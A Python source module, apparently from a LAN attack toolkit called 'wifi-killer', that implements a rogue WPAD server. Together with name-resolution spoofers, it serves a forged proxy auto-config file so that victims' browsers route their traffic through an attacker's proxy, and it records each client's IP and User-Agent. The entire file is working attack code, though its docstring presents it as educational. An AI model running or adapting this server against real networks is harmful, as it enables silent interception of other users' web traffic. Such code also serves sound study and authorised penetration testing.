"""
wpad_server.py — Mini HTTP server that serves the WPAD ``wpad.dat`` file.

Pairs with the existing LLMNR / NBT-NS / mDNS / DNS spoofers — those
modules answer name queries for ``wpad`` with our IP, then the victim's
browser fetches ``http://wpad/wpad.dat`` from us and applies the proxy
auto-config we hand back.

PAC file (RFC-less but well-established):

    function FindProxyForURL(url, host) {
        return "PROXY <attacker_ip>:<port>; DIRECT";
    }

The ``DIRECT`` fallback means clients keep working even if our proxy is
down — they get a usable network either way, which avoids breaking the
shared LAN during demos.

We don't actually run a proxy in this module — collecting client HTTP
traffic is the job of a separate MITM proxy if the operator wants it.
The educational value is in demonstrating how WPAD lets *any* host on
the link silently inject browser proxy settings.

PAC content-type and filename per common Windows / Mozilla expectations:

* ``wpad.dat``  →  ``application/x-ns-proxy-autoconfig``
* ``proxy.pac`` →  ``application/x-ns-proxy-autoconfig``

Source-cited details in the README; this module just serves bytes.
"""

from __future__ import annotations

import collections
import http.server
import socket
import socketserver
import threading
import time
from typing import Optional


# Default port — 80 is canonical so victims that perform
# ``http://wpad/wpad.dat`` automatically hit us. Browsers won't try a
# different port unless DHCP option 252 explicitly redirects them.
DEFAULT_PORT = 80


def _build_pac(proxy_ip: str, proxy_port: int) -> str:
    """Return a minimal PAC payload pointing at *proxy_ip:proxy_port*."""
    return (
        "function FindProxyForURL(url, host) {\n"
        f'    return "PROXY {proxy_ip}:{proxy_port}; DIRECT";\n'
        "}\n"
    )


class _WPADRequestHandler(http.server.BaseHTTPRequestHandler):
    """Serve every reasonable WPAD URL with the same PAC body."""

    # Filled in by ``WPADServer.start()`` before the server starts handling.
    server_version = "wifi-killer-wpad/1.0"
    sys_version = ""
    pac_payload: str = ""
    on_hit = staticmethod(lambda req: None)
    # Class-level flag so all handler instances share quietness.
    quiet: bool = True

    def log_message(self, fmt: str, *args) -> None:  # noqa: A003
        # Silence the default stderr logging — the GUI is the channel.
        return

    def _serve_pac(self) -> None:
        body = self.pac_payload.encode("ascii")
        self.send_response(200)
        self.send_header("Content-Type", "application/x-ns-proxy-autoconfig")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)
        try:
            self.on_hit({
                "ts":     time.time(),
                "client": self.client_address[0],
                "path":   self.path,
                "ua":     self.headers.get("User-Agent", "") or "",
            })
        except Exception:
            pass

    def do_GET(self) -> None:  # noqa: N802
        # Any path that looks like a WPAD lookup is served the PAC.
        # Some browsers / OS combinations request ``/wpad.dat`` from
        # ``http://wpad/``; others use proxy.pac. We accept both.
        path_lower = self.path.lower()
        if (path_lower.endswith("wpad.dat") or path_lower.endswith("proxy.pac")
                or path_lower in ("/", "/wpad")):
            self._serve_pac()
            return
        self.send_response(404)
        self.send_header("Content-Length", "0")
        self.end_headers()

    do_HEAD = do_GET  # noqa: N815


class _ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """Per-request thread so a slow client doesn't block the next."""

    daemon_threads = True
    allow_reuse_address = True


class WPADServer:
    """Tiny background HTTP server that hands out a forged PAC config.

    Combine with the DNS / LLMNR / NBT-NS / mDNS spoofers (which all
    advertise our IP for the name ``wpad``) and clients on the link
    will automatically fetch the PAC file from this server.

    Parameters
    ----------
    bind_ip:
        IP to bind on. Use ``0.0.0.0`` to accept connections on every
        interface — usually what you want when the attacker's IP is on
        a single LAN segment.
    port:
        TCP port to listen on. Defaults to 80 because the PAC URL is
        served plain HTTP without a port hint.
    proxy_ip / proxy_port:
        The proxy address embedded in the PAC body. Typically the
        attacker's IP + the port of a separate MITM proxy you're
        running. Falls back to direct connection if the proxy is down.
    """

    HIT_LIMIT = 500

    def __init__(
        self,
        bind_ip: str = "0.0.0.0",
        port: int = DEFAULT_PORT,
        proxy_ip: str = "",
        proxy_port: int = 8080,
    ) -> None:
        self.bind_ip = bind_ip
        self.port = int(port)
        self.proxy_ip = proxy_ip
        self.proxy_port = int(proxy_port)
        self._server: Optional[_ThreadedHTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()
        self.hits: int = 0
        self.recent_hits: collections.deque = collections.deque(
            maxlen=self.HIT_LIMIT,
        )
        self.started_at: float = 0.0

    # ------------------------------------------------------------------ #

    @property
    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    @property
    def uptime_seconds(self) -> float:
        return time.time() - self.started_at if self.started_at else 0.0

    def start(self) -> None:
        if not self.proxy_ip:
            raise RuntimeError(
                "WPAD server needs a proxy_ip — the address embedded "
                "in the PAC payload (typically this attacker's IP)."
            )
        if self.is_running:
            return
        # Install per-instance state on the shared handler class.
        _WPADRequestHandler.pac_payload = _build_pac(
            self.proxy_ip, self.proxy_port,
        )
        _WPADRequestHandler.on_hit = self._on_hit
        try:
            self._server = _ThreadedHTTPServer(
                (self.bind_ip, self.port), _WPADRequestHandler,
            )
        except OSError as exc:
            raise RuntimeError(
                f"WPAD server bind failed on {self.bind_ip}:{self.port} "
                f"— {exc}. Port 80 typically requires root."
            ) from exc
        self.started_at = time.time()
        self._thread = threading.Thread(
            target=self._server.serve_forever,
            kwargs={"poll_interval": 0.5},
            daemon=True,
        )
        self._thread.start()

    def stop(self) -> None:
        if self._server is not None:
            try:
                self._server.shutdown()
                self._server.server_close()
            except Exception:
                pass
            self._server = None
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "running":     self.is_running,
                "uptime":      self.uptime_seconds,
                "bind":        f"{self.bind_ip}:{self.port}",
                "proxy":       f"{self.proxy_ip}:{self.proxy_port}",
                "hits":        self.hits,
                "recent_hits": list(self.recent_hits),
            }

    # ------------------------------------------------------------------ #

    def _on_hit(self, hit: dict) -> None:
        with self._lock:
            self.hits += 1
            self.recent_hits.append(hit)
